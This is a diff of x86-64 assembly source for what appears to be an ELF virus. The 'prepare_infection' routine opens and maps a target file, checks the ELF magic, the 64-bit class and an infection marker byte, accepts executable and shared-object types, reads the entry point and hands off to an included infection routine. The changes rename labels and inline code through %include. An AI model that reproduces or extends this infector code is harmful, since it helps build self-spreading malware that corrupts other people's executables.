@@ -1,5 +1,3 @@
-prepare_infection:
-
 	PUSH_ALL
 	; celui la ici
 	mov		rax, SYS_open
@@ -13,7 +11,7 @@ prepare_infection:
 
 
 	cmp		rax, 0
-	jle		.return
+	jle		.returnprepare_infection
 	mov		r12, rax
 
 	mov		rdi, [rbp + 16]
@@ -33,7 +31,7 @@ prepare_infection:
 	;lea     rsi, [stack]
 	syscall
 	cmp     rax, 0
-	jl     .close_file_nomap
+	jl     .close_file_nomapprepare_infection
 
 	; save file size
 	mov     rax, [rsi + 48]
@@ -53,21 +51,21 @@ prepare_infection:
 	xor     r9, r9
 	syscall
 	cmp     rax, -4095
-	jae     .close_file_nomap
+	jae     .close_file_nomapprepare_infection
 
 	mov r14, rax
 
 	; check is elf
 	cmp dword [r14], 0x464c457f
-	jne .close_file
+	jne .close_fileprepare_infection
 
 	; check is elf64
 	cmp byte [r14 + 0x4], 0x2
-	jne .close_file
+	jne .close_fileprepare_infection
 
 	; check infected
 	cmp byte [r14 + 0xa], 0x0
-	jne .close_file
+	jne .close_fileprepare_infection
 
 
 	mov		rax, [rbp + 16]
@@ -77,18 +75,18 @@ prepare_infection:
 
 
 	cmp	byte [r14 + 0x10], 0x02
-	je	.continue_infection
+	je	.continue_infectionprepare_infection
 	mov		rax, [rbp + 16]
 	add		rax, mydata.dynm
 	mov	BYTE [rax], 1
 	cmp	byte [r14 + 0x10], 0x03
-	je	.continue_infection
+	je	.continue_infectionprepare_infection
 
 
 
-	jmp	.close_file
+	jmp	.close_fileprepare_infection
 
-	.continue_infection:
+	.continue_infectionprepare_infection:
 
 	mov		rax, [r14 + 0x18] ; e_entry
 	mov		rcx, [rbp + 16]
@@ -108,23 +106,23 @@ prepare_infection:
 	NOP
 	NOP
 
-	call	infection
+	%include "functions/infection.s"
+	;call	infection
 
-	.close_file:
+	.close_fileprepare_infection:
 		mov		rax, SYS_munmap
 		mov		rdi, r14
 		mov		rsi, [rbp + 16]
 		add		rsi, mydata.file_size
 		mov		rsi, [rsi]
 		syscall
-	.close_file_nomap:
+	.close_file_nomapprepare_infection:
 		mov		rax, SYS_close
 		mov		rdi, r12
 		syscall
-	.return:
+	.returnprepare_infection:
 		mov		rsi, [rbp + 16]
 		add		rsi, mydata.path
 		;lea		rsi, [rel path]
-		call	sub_val
+		%include "functions/sub_val.s"
 		POP_ALL
-		ret
